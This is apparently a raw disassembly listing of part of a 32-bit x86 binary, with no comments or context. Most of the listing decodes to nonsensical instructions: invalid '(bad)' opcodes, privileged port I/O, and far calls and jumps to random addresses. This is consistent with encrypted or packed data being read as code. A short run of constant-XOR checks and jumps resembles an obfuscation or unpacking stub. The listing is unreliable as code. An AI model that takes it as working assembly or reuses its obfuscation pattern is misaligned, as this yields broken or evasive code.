  41525d:	aam    0xcb
  41525f:	scas   al,BYTE PTR es:[edi]
  415260:	cmp    eax,esp
  415262:	and    eax,0x1434dcf1
  415267:	mov    ds:0x54c70c75,eax
  41526c:	xchg   edi,eax
  41526d:	out    dx,eax
  41526e:	in     eax,0x18
  415270:	out    0xaf,al
  415272:	enter  0xd4ba,0x73
  415276:	retf   0x41b7
  415279:	add    eax,0x8817438c
  41527e:	add    dl,BYTE PTR [edx]
  415280:	(bad)  
  415281:	jle    0x4152fc
  415283:	(bad)  
  415284:	push   ss
  415285:	mov    esp,0xbfa2f711
  41528a:	es jecxz 0x415309
  41528d:	out    dx,al
  41528e:	rol    BYTE PTR [ebx+0x4d],1
  415291:	in     eax,dx
  415292:	jns    0x415222
  415294:	add    DWORD PTR [edi+ebp*4-0x56],eax
  415298:	shl    BYTE PTR [ebp+edi*8-0x80],cl
  41529c:	and    al,dh
  41529e:	js     0x415257
  4152a0:	mov    ds:0xdf104057,al
  4152a5:	adc    al,0x4c
  4152a7:	cmp    al,0x78
  4152a9:	imul   DWORD PTR [eax-0x14488c13]
  4152af:	hlt    
  4152b0:	ficom  DWORD PTR [esi-0x173620f4]
  4152b6:	pop    esi
  4152b7:	data16 shr BYTE PTR [esi],1
  4152ba:	out    dx,eax
  4152bb:	xor    dl,bh
  4152bd:	call   0xc0075d51
  4152c2:	ds sar esp,1
  4152c5:	loope  0x41529d
  4152c7:	and    DWORD PTR [ebp-0x49],esp
  4152ca:	or     eax,0x481ba940
  4152cf:	or     eax,0xb82cbfa
  4152d4:	loope  0x4152ea
  4152d6:	div    DWORD PTR [edi-0x3f]
  4152d9:	lods   eax,DWORD PTR ds:[esi]
  4152da:	ret    
  4152db:	hlt    
  4152dc:	add    eax,0x27f4f31f
  4152e1:	arpl   WORD PTR [eax+0x3e],cx
  4152e4:	out    0x1f,eax
  4152e6:	mov    fs,ecx
  4152e8:	or     ecx,esp
  4152ea:	xchg   ebx,eax
  4152eb:	test   BYTE PTR [ebx],bl
  4152ed:	pop    ecx
  4152ee:	loop   0x4152ba
  4152f0:	arpl   WORD PTR [ebx-0x3ac6ca0e],di
  4152f6:	jle    0x4152d0
  4152f8:	(bad)  
  4152f9:	fnstenv [eax]
  4152fb:	in     eax,0xc
  4152fd:	mov    ecx,0x98181056
  415302:	or     bl,BYTE PTR [edi+0x34618bed]
  415308:	nop
  415309:	clc    
  41530a:	mov    WORD PTR [edx],ds
  41530c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41530d:	mov    ebx,0xbe5c4029
  415312:	call   0x2068:0x9f97f8b6
  415319:	retf   
  41531a:	mov    edx,0x8d976167
  41531f:	xchg   esi,eax
  415320:	xchg   ecx,eax
  415321:	adc    esi,DWORD PTR [edi+ebp*4-0x29]
  415325:	jb     0x415349
  415327:	aas    
  415328:	jle    0x415302
  41532a:	cwde   
  41532b:	(bad)  
  41532c:	jge    0x41537b
  41532e:	jae    0x41535b
  415330:	and    eax,DWORD PTR [esi]
  415332:	fdivr  DWORD PTR [ebp+ebp*2-0xd219e7d]
  415339:	stos   DWORD PTR es:[edi],eax
  41533a:	test   al,0xc5
  41533c:	or     BYTE PTR [ecx+0x38d9d52d],dl
  415342:	std    
  415343:	cmc    
  415344:	fidivr WORD PTR [edi]
  415346:	scas   al,BYTE PTR es:[edi]
  415347:	arpl   WORD PTR [ebx+0xbfae788],sp
  41534d:	add    ch,dl
  41534f:	ins    DWORD PTR es:[edi],dx
  415350:	jae    0x415353
  415352:	push   ss
  415353:	jp     0x415373
  415355:	dec    eax
  415356:	mov    BYTE PTR [ebp-0x79d15e73],0xc2
  41535d:	fild   QWORD PTR [ecx+0x5bb028ce]
  415363:	xchg   edi,eax
  415364:	enter  0xe038,0x84
  415368:	mov    gs,ebx
  41536a:	std    
  41536b:	push   ds
  41536c:	aam    0xe3
  41536e:	sub    edi,DWORD PTR [ebp-0x51f9e093]
  415374:	push   edx
  415375:	fidivr DWORD PTR [ebx-0x286270]
  41537b:	mov    eax,0x2abd52f3
  415380:	sbb    esp,DWORD PTR [edx-0x37]
  415383:	fdiv   st(5),st
  415385:	sbb    al,0x67
  415387:	jmp    FWORD PTR [esi-0x2f]
  41538a:	dec    ecx
  41538b:	sub    dl,bh
  41538d:	dec    edi
  41538e:	sti    
  41538f:	imul   DWORD PTR [ecx]
  415391:	clc    
  415392:	jns    0x41537b
  415394:	mov    bh,0xe
  415396:	sbb    BYTE PTR [ecx],bl
  415398:	popf   
  415399:	(bad)  
  41539a:	cmc    
  41539b:	loop   0x4153a1
  41539d:	fwait
  41539e:	aad    0x82
  4153a0:	or     eax,0x53b971b8
  4153a5:	adc    cl,BYTE PTR [edi+ebx*8-0x4d94fda8]
  4153ac:	jmp    0x415382
  4153ae:	jnp    0x415348
  4153b0:	mov    al,0x30
  4153b2:	sbb    dh,al
  4153b4:	ret    0xc805
  4153b7:	or     eax,0x2ad3de61
  4153bc:	adc    esp,eax
  4153be:	retf   
  4153bf:	rcr    DWORD PTR ds:0x952acb4f,1
  4153c5:	out    0x9d,al
  4153c7:	inc    edi
  4153c8:	rol    BYTE PTR [esi-0x2a9a38a8],cl
  4153ce:	mov    al,cl
  4153d0:	xor    DWORD PTR [ebx+0x3f],ecx
  4153d3:	in     al,dx
  4153d4:	xor    bl,cl
  4153d6:	repz sub DWORD PTR [edi+eiz*2+0x753b6a0e],ebx
  4153de:	sub    dh,BYTE PTR [ebx]
  4153e0:	addr16 pop esi
  4153e2:	shl    DWORD PTR [ecx-0x19f414d],1
  4153e8:	gs xchg esi,eax
  4153ea:	sbb    dh,0x4
  4153ed:	dec    esp
  4153ee:	xchg   edi,eax
  4153ef:	loope  0x415412
  4153f1:	push   ss
  4153f2:	mov    eax,ds:0xccace2bf
  4153f7:	enter  0x6c34,0xb4
  4153fb:	mov    dh,0xac
  4153fd:	into   
  4153fe:	aaa    
  4153ff:	sbb    DWORD PTR [eax+0x9486460],ebp
  415405:	fxch   st(2)
  415407:	sbb    BYTE PTR [esi],ch
  415409:	scas   al,BYTE PTR es:[edi]
  41540a:	dec    edi
  41540b:	out    dx,eax
  41540c:	inc    eax
  41540d:	mov    al,ds:0x390ae7c8
  415412:	mov    al,0x16
  415414:	out    dx,eax
  415415:	ficom  WORD PTR [edi+0x20aaa3f1]
  41541b:	push   ss
  41541c:	jne    0x415492
  41541e:	cmc    
  41541f:	in     eax,0x88
  415421:	pop    ss
  415422:	jns    0x4153ab
  415424:	aam    0x31
  415426:	leave  
  415427:	std    
  415428:	adc    ecx,DWORD PTR [eax-0x77]
  41542b:	xor    al,0x89
  41542d:	inc    ebp
  41542e:	jb     0x415490
  415430:	pusha  
  415431:	ins    DWORD PTR es:[edi],dx
  415432:	jo     0x415492
  415434:	mov    ebp,DWORD PTR [edi+0x69]
  415437:	(bad)  
  415438:	aam    0x47
  41543a:	or     edi,DWORD PTR [eax+ebx*4]
  41543d:	pushf  
  41543e:	lods   eax,DWORD PTR ds:[esi]
  41543f:	std    
  415440:	popa   
  415441:	call   0x57f96795
  415446:	adc    ecx,ecx
  415448:	inc    ebx
  415449:	dec    edi
  41544a:	call   0x1458afa1
  41544f:	add    DWORD PTR [edx-0x2e1213db],ecx
  415455:	and    ebp,edi
  415457:	pop    esi
  415458:	xchg   ebx,eax
  415459:	xchg   edx,eax
  41545a:	inc    edx
  41545b:	xchg   edx,eax
  41545c:	push   es
  41545d:	outs   dx,DWORD PTR ds:[esi]
  41545e:	daa    
  41545f:	je     0x4154a0
  415461:	sbb    DWORD PTR [esi-0x5596b177],ecx
  415467:	in     al,0x9e
  415469:	pop    eax
  41546a:	mov    eax,ds:0xbcdaa16d
  41546f:	fcomp  DWORD PTR [ecx+eiz*1+0x6]
  415473:	clc    
  415474:	ins    BYTE PTR es:[edi],dx
  415475:	test   al,0xc
  415477:	add    eax,edx
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x99
  4154c8:	sbb    eax,0x2368cda
  4154cd:	jg     0x41553f
  4154cf:	mov    ecx,0xbb70707e
  4154d4:	cmp    DWORD PTR [eax],esi
  4154d6:	jecxz  0x4154c0
  4154d8:	lods   al,BYTE PTR ds:[esi]
  4154d9:	clc    
  4154da:	fsubr  QWORD PTR [edi-0x4046701d]
  4154e0:	je     0x415509
  4154e2:	leave  
  4154e3:	outs   dx,DWORD PTR ds:[esi]
  4154e5:	je     0x415499
  4154e7:	cmp    BYTE PTR [edx],0xe4
  4154ea:	mov    al,0x8c
  4154ec:	ins    DWORD PTR es:[edi],dx
  4154ed:	in     eax,dx
  4154ee:	xor    ch,ah
  4154f0:	fnstenv [ebx+0x67ac2cc4]
  4154f6:	add    ecx,DWORD PTR [ebp+ebx*4-0x35a9efe7]
  4154fd:	sub    eax,0xc962dd3e
  415502:	(bad)  
  415503:	ret    0xc58e
  415506:	(bad)  [ebx+0x94fb0e]
  41550c:	adc    DWORD PTR [ecx],ebx
  41550e:	mov    eax,0x4329a482
  415513:	mov    WORD PTR [edi-0x77],?
  415516:	xor    al,0xc6
  415518:	adc    eax,0x605129ff
  41551d:	es loope 0x4154cb
  415520:	loope  0x41552a
  415522:	pusha  
  415523:	jp     0x41554d
  415525:	iret   
  415526:	lods   al,BYTE PTR ds:[esi]
  415527:	inc    ebp
  415528:	sub    esi,DWORD PTR [esi+0x1f78abd7]
  41552e:	(bad)  [ebp-0x3abfce5d]
  415534:	clc    
  415535:	ins    BYTE PTR es:[edi],dx
  415536:	icebp  
  415537:	les    eax,FWORD PTR [edi+0x36e04d06]
  41553d:	and    al,0xec
  41553f:	xcrypt-cfb (bad)
  415540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415541:	jecxz  0x41558e
  415543:	push   ebp
  415544:	call   0x96ce:0xbddb45fd
  41554b:	popa   
  41554c:	jmp    0xcb07:0x310113ec
  415553:	mov    eax,cs
  415555:	xlat   BYTE PTR ds:[ebx]
  415556:	dec    ebp
  415557:	out    0xbf,eax
  415559:	sub    esp,DWORD PTR [edi]
  41555b:	aas    
  41555c:	adc    bl,BYTE PTR [edi-0x68bb92ed]
  415562:	out    dx,eax
  415563:	out    0xc9,eax
  415565:	imul   esp,DWORD PTR [esi-0x3c386bb6],0xe2c0b86b
  41556f:	lock scas al,BYTE PTR es:[edi]
  415571:	ficom  WORD PTR [ebx-0x2021fbee]
  415577:	sti    
  415578:	retf   0xdffb
  41557b:	xchg   esi,eax
  41557c:	xchg   esi,eax
  41557d:	fucomip st,st(6)
  41557f:	sti    
  415580:	leave  
  415581:	or     DWORD PTR [esi],esi
  415583:	sub    eax,0x7d4b3eb7
  415588:	jno    0x41554e
  41558a:	ins    BYTE PTR es:[edi],dx
  41558b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41558c:	pop    edx
  41558d:	push   esi
  41558e:	js     0x415510
  415590:	mov    eax,ds:0x58043a6a
  415595:	pop    ds
  415596:	mov    al,0xf6
  415598:	xchg   eax,esi
  41559a:	pop    edx
  41559b:	addr16 int3 
  41559d:	xor    al,0x3
  41559f:	rcl    DWORD PTR [ecx+0x34],cl
  4155a2:	iret   
  4155a3:	adc    ah,BYTE PTR [edi+0x24]
  4155a6:	fldln2 
  4155a8:	sub    eax,0x396bb7ba
  4155ad:	rcr    BYTE PTR [edi],1
  4155af:	dec    esp
  4155b0:	pop    es
  4155b1:	out    dx,eax
  4155b2:	sbb    DWORD PTR [eax+0x574209c3],esi
  4155b8:	ret    
  4155b9:	cmp    bh,ah
  4155bb:	test   eax,0x9a7f2ec2
  4155c0:	push   cs
  4155c1:	jmp    0xe60f2030
  4155c6:	and    eax,0xe0f271d0
  4155cb:	pop    ds
  4155cc:	mov    dh,BYTE PTR [esi]
  4155ce:	fdivr  st,st(1)
  4155d0:	in     eax,dx
  4155d1:	push   esi
  4155d2:	mov    ah,cl
  4155d4:	loope  0x4155dd
  4155d6:	lahf   
  4155d7:	nop
  4155d8:	xchg   edi,eax
  4155d9:	scas   eax,DWORD PTR es:[edi]
  4155da:	adc    cl,al
  4155dc:	lods   al,BYTE PTR ds:[esi]
  4155dd:	cld    
  4155de:	mov    al,0xcc
  4155e0:	jge    0x415605
  4155e2:	adc    DWORD PTR [eax-0x74],ecx
  4155e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155e6:	add    eax,0x5f83d16d
  4155eb:	xor    ah,BYTE PTR [edi+0x77aa7b79]
  4155f1:	or     ah,BYTE PTR [edi]
  4155f3:	jno    0x415605
  4155f5:	dec    ebx
  4155f6:	out    dx,eax
  4155f7:	sub    eax,0x4ad28714
  4155fc:	xlat   BYTE PTR ds:[ebx]
  4155fd:	dec    ebx
  4155fe:	sbb    eax,0x28a1b793
  415603:	test   BYTE PTR [edi-0x60],dl
  415606:	jnp    0x41561d
  415608:	outs   dx,BYTE PTR ds:[esi]
  415609:	pop    ds
  41560a:	and    DWORD PTR [ebx-0x6912cd72],esi
  415610:	shl    DWORD PTR [esi],cl
  415612:	(bad)  
  415613:	mov    bl,0x97
  415615:	jns    0x41565c
  415617:	add    BYTE PTR ds:0xa2650a50,bh
  41561d:	bound  ebp,QWORD PTR [eax]
  41561f:	retf   
  415620:	add    al,0x8e
  415622:	jmp    0x415641
  415624:	push   cs
  415625:	sti    
  415626:	je     0x41563d
  415628:	xor    eax,DWORD PTR [ecx-0x7386521a]
  41562e:	push   ebx
  41562f:	or     cl,0xae
  415632:	(bad)  
  415633:	dec    ebp
  415634:	add    eax,DWORD PTR [eax]
  415636:	cld    
  415637:	aas    
  415638:	in     eax,dx
  415639:	inc    ecx
  41563a:	ror    DWORD PTR [edx-0x80],1
  41563d:	mov    esp,0xac3cb5d6
  415642:	pop    ebp
  415643:	inc    edx
  415644:	sub    eax,ebp
  415646:	push   ecx
  415647:	mov    bh,bl
  415649:	stos   BYTE PTR es:[edi],al
  41564a:	daa    
  41564b:	ss push edi
  41564d:	or     al,0x5b
  415650:	in     al,0xa
  415652:	xor    esi,DWORD PTR [eax-0x64]
  415655:	dec    edx
  415656:	and    eax,0x89616b8d
  41565b:	jnp    0x4156d5
  41565d:	mov    eax,ds:0xd0f34daf
  415662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415663:	adc    BYTE PTR [ebx+0x7699d58f],dh
  415669:	loopne 0x415650
  41566b:	mov    ah,0xe1
  41566d:	mov    ecx,0x6ae52a55
  415672:	xlat   BYTE PTR ds:[ebx]
  415673:	pmullw mm7,QWORD PTR [eax]
  415676:	or     BYTE PTR [edx],al
  415678:	fdiv   QWORD PTR [eax+0x1a8d1f99]
  41567e:	cmc    
  41567f:	sub    DWORD PTR [ecx+ecx*4+0x10],ebp
  415683:	mov    ch,0x2f
  415685:	aas    
  415686:	push   cs
  415687:	icebp  
  415688:	pop    ebp
  415689:	scas   al,BYTE PTR es:[edi]
  41568a:	inc    ebp
  41568b:	sbb    eax,0x4e1ab628
  415690:	inc    eax
  415691:	add    dl,ah
  415693:	mov    dl,0xe3
  415695:	retf   0xedd8
  415698:	sub    bl,BYTE PTR [edx]
  41569a:	das    
  41569b:	test   cl,ah
  41569d:	push   esp
  41569e:	repz xchg esp,eax
  4156a0:	xchg   BYTE PTR [ebp-0x18cebc0b],dl
  4156a6:	mov    gs,WORD PTR [esi+edi*4+0x760b3807]
  4156ad:	add    DWORD PTR [ecx+0x5d79877a],edi
  4156b3:	inc    ebp
  4156b4:	in     eax,0x5b
  4156b6:	xor    eax,0x9c892b1d
  4156bb:	push   cs
  4156bc:	popf   
  4156bd:	jne    0x41567d
  4156bf:	pop    esp
  4156c0:	ficomp DWORD PTR [edi+0x1ab13d04]
  4156c6:	xor    ecx,esi
  4156c8:	sbb    DWORD PTR [ecx-0x4e90dd57],ebp
  4156ce:	push   ds
  4156cf:	bnd jbe 0x415674
  4156d2:	mov    ebp,DWORD PTR [eax+0x2c]
  4156d5:	cld    
  4156d6:	je     0x415668
  4156d8:	sbb    eax,DWORD PTR ds:[esi]
  4156db:	inc    ecx
  4156dc:	mov    ah,0xa1
  4156de:	into   
  4156df:	jo     0x41573e
  4156e1:	xor    al,0x56
  4156e3:	mov    dl,0xcd
  4156e5:	mov    DWORD PTR fs:[ebx],ebx
  4156e8:	and    cl,BYTE PTR [esi+0x3c]
  4156eb:	jns    0x415696
  4156ed:	mov    DWORD PTR [ecx],ecx
  4156ef:	outs   dx,BYTE PTR ds:[esi]
  4156f0:	xchg   ecx,eax
  4156f1:	adc    BYTE PTR [eax+ebx*8-0x456a4095],bh
  4156f8:	mov    eax,0x8ff7340b
  4156fd:	or     BYTE PTR [ecx+0x159b263d],dl
  415703:	test   BYTE PTR ds:[edi+0x54],bh
  415707:	outs   dx,DWORD PTR ds:[esi]
  415708:	cdq    
  415709:	mov    ebx,esp
  41570b:	mov    ds:0xf3ba4a6b,eax
  415710:	(bad)  
  415711:	mov    dh,0xbf
  415713:	inc    esp
  415714:	and    eax,DWORD PTR [ecx+0x11]
  415717:	dec    edx
  415718:	xchg   ecx,eax
  415719:	adc    BYTE PTR [eax+0x1b],ch
  41571c:	test   DWORD PTR [ecx],0x687e33b3
  415722:	push   ss
  415723:	cmp    al,0x86
  415725:	jmp    0xed2dbfcd
  41572a:	cdq    
  41572b:	lods   eax,DWORD PTR ds:[esi]
  41572c:	aad    0x58
  41572e:	mov    ch,0x1
  415730:	mov    al,0xc7
  415732:	add    eax,DWORD PTR [esi]
  415734:	add    BYTE PTR [ecx],dl
  415736:	jo     0x41575c
  415738:	(bad)  
  415739:	xchg   ecx,eax
  41573a:	jo     0x4157ba
  41573c:	sub    dl,al
  41573e:	sbb    bh,al
  415740:	test   eax,0x4cefc60
  415745:	and    eax,0x8fe95f62
  41574a:	xchg   DWORD PTR [edx+0x4e109f27],esi
  415750:	es mov edx,0xbdbd6d79
  415756:	add    BYTE PTR [ebx],0x42
  415759:	jl     0x4156fe
  41575b:	sbb    esi,DWORD PTR ds:0xccdc2dd4
  415761:	mov    bl,0x57
  415763:	push   eax
  415764:	ins    BYTE PTR es:[edi],dx
  415765:	and    ebx,esp
  415767:	mov    eax,0x632bd489
  41576c:	jp     0x4157a7
  41576e:	push   edx
  41576f:	xor    dl,dh
  415771:	cwde   
  415772:	sub    eax,0xf2a3e5dc
  415777:	call   0xde64:0xf64442b7
  41577e:	dec    esi
  41577f:	call   0xf7ed:0x86d6f70d
  415786:	mov    cl,0xe2
  415788:	aas    
  415789:	inc    edx
  41578a:	mov    ?,WORD PTR [eax+0x22]
  41578d:	jb     0x415762
  41578f:	push   0xb263bb0c
  415794:	push   edi
  415795:	mov    BYTE PTR [ebx-0x22],dh
  415798:	ins    BYTE PTR es:[edi],dx
  415799:	pop    ebp
  41579a:	mov    esi,0x32729c
  41579f:	add    edi,esi
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR [esi+0x7f15376a],bh
  4157bc:	movq   QWORD PTR [eax-0x47],mm6
  4157c0:	jle    0x415832
  4157c2:	jo     0x4157c4
  4157c4:	outs   dx,DWORD PTR ds:[esi]
  4157c5:	(bad)  
  4157c6:	das    
  4157c7:	pop    ecx
  4157c8:	pop    esi
  4157c9:	rcr    BYTE PTR [esi],1
  4157cb:	addr16 xor bh,dl
  4157ce:	test   eax,0x9380edbb
  4157d3:	enter  0xd677,0x4
  4157d7:	ins    BYTE PTR es:[edi],dx
  4157d8:	fmul   st,st(5)
  4157da:	aas    
  4157db:	push   es
  4157dc:	add    al,0x21
  4157de:	xchg   ebx,eax
  4157df:	in     al,dx
  4157e0:	ja     0x415813
  4157e2:	sub    esi,edi
  4157e4:	addr16 mov al,0xcd
  4157e7:	cld    
  4157e8:	mov    ch,0xb8
  4157ea:	cmp    eax,0xcb944113
  4157ef:	add    dl,ch
  4157f1:	cli    
  4157f2:	stos   DWORD PTR es:[edi],eax
  4157f3:	xchg   BYTE PTR [edi],cl
  4157f5:	sti    
  4157f6:	cmp    al,0x37
  4157f8:	imul   ebx,DWORD PTR [ebp-0x20],0xa5f18e88
  4157ff:	jmp    0xbe04a9d
  415804:	ins    BYTE PTR es:[edi],dx
  415805:	dec    DWORD PTR [edi-0x7c0824a9]
  41580b:	ficomp WORD PTR ds:0xa592b582
  415811:	mov    al,0x99
  415813:	sbb    ebx,DWORD PTR [edx-0x35]
  415816:	jmp    0x415870
  415818:	test   DWORD PTR [ebx-0x3],edx
  41581b:	sbb    ch,ah
  41581d:	mov    eax,ds:0x55e032be
  415822:	int3   
  415823:	jmp    0xb293:0x3ade4f02
  41582a:	sahf   
  41582b:	push   eax
  41582c:	arpl   WORD PTR [ebp-0x4c],ax
  41582f:	fidivr WORD PTR [ebp-0x70dc07ce]
  415835:	mov    esp,0x2564f819
  41583a:	cmp    BYTE PTR [edx-0x60],ch
  41583d:	push   0x53851230
  415842:	retf   0x7d7f
  415845:	fild   WORD PTR [ebp-0x1a0e9138]
  41584b:	enter  0x19ba,0x16
  41584f:	into   
  415850:	test   DWORD PTR [edx-0x60],ebp
  415853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415854:	fcmovnu st,st(7)
  415856:	mov    ebx,0xa6ffc013
  41585b:	inc    edx
  41585c:	mov    ds:0x60df40f1,eax
  415861:	hlt    
  415862:	sub    ebx,DWORD PTR [esi]
  415864:	and    eax,0x6a95a4b7
  415869:	adc    dl,BYTE PTR [edx]
  41586b:	jle    0x4158be
  41586d:	dec    edx
  41586e:	mov    ch,0xad
  415870:	out    dx,eax
  415871:	sub    BYTE PTR [edx+0x4613c125],0x53
  415878:	cmc    
  415879:	and    edx,edi
  41587b:	sbb    DWORD PTR [edi+0x433b337e],ebx
  415881:	mov    bh,0xef
  415883:	stos   DWORD PTR es:[edi],eax
  415884:	mov    ecx,0x8f9c4f8e
  415889:	and    BYTE PTR [ebp+0x7c],ch
  41588c:	mov    esi,0xf29f94fd
  415891:	sub    bl,bl
  415893:	lock sub cl,dh
  415896:	fnsave [ebx-0x530916b]
  41589c:	pop    es
  41589d:	sbb    al,0xec
  41589f:	mov    esp,0xc26197c7
  4158a4:	adc    ch,BYTE PTR [eax]
  4158a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158a7:	cmc    
  4158a8:	push   0x4
  4158aa:	ins    DWORD PTR es:[edi],dx
  4158ab:	leave  
  4158ac:	inc    esp
  4158ad:	push   ebx
  4158ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158af:	mov    eax,eax
  4158b1:	inc    ecx
  4158b2:	cmp    al,0xf
  4158b4:	loopne 0x415866
  4158b6:	data16 jno 0x415868
  4158b9:	adc    BYTE PTR [eax-0x428e13c2],dl
  4158bf:	je     0x4158ae
  4158c1:	and    cl,0x8f
  4158c4:	jmp    0x4158f5
  4158c6:	cmp    al,0xdd
  4158c8:	mov    eax,ds:0xe7ced5b7
  4158cd:	xor    al,0xe4
  4158cf:	and    edx,DWORD PTR [ebx+0x68]
  4158d2:	sbb    eax,0xb51348ec
  4158d7:	sahf   
  4158d8:	shl    BYTE PTR [ecx+0x6537d6ca],1
  4158de:	jmp    0x415919
  4158e0:	bnd jmp 0x4158be
  4158e3:	push   edx
  4158e4:	ficom  DWORD PTR [edi]
  4158e6:	mov    ds:0x4d38745b,eax
  4158eb:	pop    esp
  4158ec:	and    BYTE PTR [edi+0x3],dh
  4158ef:	pop    ecx
  4158f0:	mov    esi,0xa2241d28
  4158f5:	test   al,0xab
  4158f7:	xor    DWORD PTR [ebp-0x284d1be9],edi
  4158fd:	push   es
  4158fe:	(bad)  [edi-0x31]
  415901:	es dec sp
  415904:	adc    DWORD PTR [edi],0x62
  415907:	inc    edi
  415908:	push   cs
  415909:	(bad)  
  41590a:	ja     0x415955
  41590c:	dec    eax
  41590d:	mov    dh,0x96
  41590f:	and    ecx,ecx
  415911:	push   edi
  415912:	rol    edi,0x6b
  415915:	add    DWORD PTR [esi+0x2617a54e],ecx
  41591b:	and    bl,BYTE PTR [eax+0x68]
  41591e:	shr    ah,0x75
  415921:	adc    eax,0xa8163da5
  415926:	xchg   edx,eax
  415927:	mov    DWORD PTR [edx-0x14cfef91],ebp
  41592d:	mov    eax,0x95c43bfd
  415932:	aas    
  415933:	xchg   esp,eax
  415934:	sbb    ebp,esp
  415936:	aam    0xe3
  415938:	fcomp  QWORD PTR [eax-0x39]
  41593b:	push   0xfb4c73c7
  415940:	lds    esi,FWORD PTR [eax+eax*8+0x10]
  415944:	fmul   st(5),st
  415946:	ret    
  415947:	push   ebx
  415948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415949:	loop   0x4159b7
  41594b:	in     al,0x8b
  41594d:	push   ebp
  41594e:	pushf  
  41594f:	cmp    eax,DWORD PTR [ecx+0x6e69ca81]
  415955:	push   cs
  415956:	test   BYTE PTR [eax+0x553d7462],al
  41595c:	pop    ebx
  41595d:	mov    ah,0x0
  41595f:	mov    cl,0xf4
  415961:	(bad)  
  415962:	clc    
  415963:	sti    
  415964:	jmp    0xb8fe:0x3d8cceba
  41596b:	dec    edi
  41596c:	popf   
  41596d:	test   eax,0x1e8811f7
  415972:	mov    al,0xe8
  415974:	pop    ebx
  415975:	or     ecx,DWORD PTR [edx+edx*4]
  415978:	jl     0x41599f
  41597a:	in     al,dx
  41597b:	adc    BYTE PTR [ebx-0x4a36ed74],bl
  415981:	mov    cl,0xfe
  415983:	in     al,0x44
  415985:	out    0xb5,eax
  415987:	fwait
  415988:	jecxz  0x415958
  41598a:	sub    eax,DWORD PTR ds:0xdd8c6c32
  415990:	adc    DWORD PTR [ecx+eiz*2+0x2e],ebx
  415994:	fst    QWORD PTR [edi+edx*4+0x3feeeb6a]
  41599b:	retf   
  41599c:	cmp    BYTE PTR ss:[edx+0x7353eab6],dh
  4159a3:	or     esi,0x14
  4159a6:	cmp    ebp,eax
  4159a8:	leave  
  4159a9:	shl    BYTE PTR [eax],cl
  4159ab:	pop    ds
  4159ac:	mov    WORD PTR ds:0x20d4ad12,?
  4159b2:	popa   
  4159b3:	fsub   st(0),st
  4159b5:	sub    bl,bh
  4159b7:	lea    ebx,[edx]
  4159b9:	mov    dh,0xfe
  4159bb:	and    DWORD PTR [ecx+ecx*8-0x77],edx
  4159bf:	and    eax,0x83eb76fa
  4159c4:	js     0x415982
  4159c6:	shr    DWORD PTR [ecx-0x1640d413],0x2a
  4159cd:	lds    ecx,FWORD PTR [esi]
  4159cf:	cdq    
  4159d0:	mov    bl,0x6d
  4159d2:	leave  
  4159d3:	(bad)  
  4159d4:	scas   eax,DWORD PTR es:[edi]
  4159d5:	or     BYTE PTR [esi+0x36],0x32
  4159d9:	sbb    eax,0x120a1777
  4159de:	ja     0x415a3a
  4159e0:	cmc    
  4159e1:	retf   
  4159e2:	sti    
  4159e3:	test   al,0x4
  4159e5:	pop    es
  4159e6:	mov    ebp,0x59529d0f
  4159eb:	xcrypt-ctr (bad)
  4159ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159ed:	(bad)  
  4159ef:	pop    edi
  4159f0:	lahf   
  4159f1:	js     0x41599e
  4159f3:	ins    DWORD PTR es:[edi],dx
  4159f4:	or     DWORD PTR [eax+0x3b],esi
  4159f7:	inc    ecx
  4159f8:	hlt    
  4159f9:	ja     0x415a4f
  4159fb:	iret   
  4159fc:	fsubr  QWORD PTR [eax+0x34]
  4159ff:	xor    eax,0xa575377b
  415a04:	inc    esi
  415a05:	outs   dx,DWORD PTR ds:[esi]
  415a06:	ret    0x6b61
  415a09:	jmp    0x8baec52b
  415a0e:	inc    eax
  415a0f:	inc    ecx
  415a10:	test   eax,0xa1fefdc4
  415a15:	fwait
  415a16:	rcr    BYTE PTR [edi-0x3d],cl
  415a19:	ja     0x415a4c
  415a1b:	mov    dl,0x7a
  415a1d:	gs dec eax
  415a1f:	loope  0x415a3d
  415a21:	mov    ecx,0xb6a310df
  415a26:	(bad)  [ebx-0x5f]
  415a29:	out    dx,eax
  415a2a:	cmp    eax,0x1ed59bfc
  415a2f:	aaa    
  415a30:	setl   BYTE PTR [ecx-0x788c4d19]
  415a37:	pusha  
  415a38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a39:	sbb    eax,0x6902c484
  415a3e:	popf   
  415a3f:	call   0x155f:0xb2108db9
  415a46:	sbb    eax,0x58b4d6b2
  415a4b:	retf   0x8700
  415a4e:	stc    
  415a4f:	push   esi
  415a50:	push   es
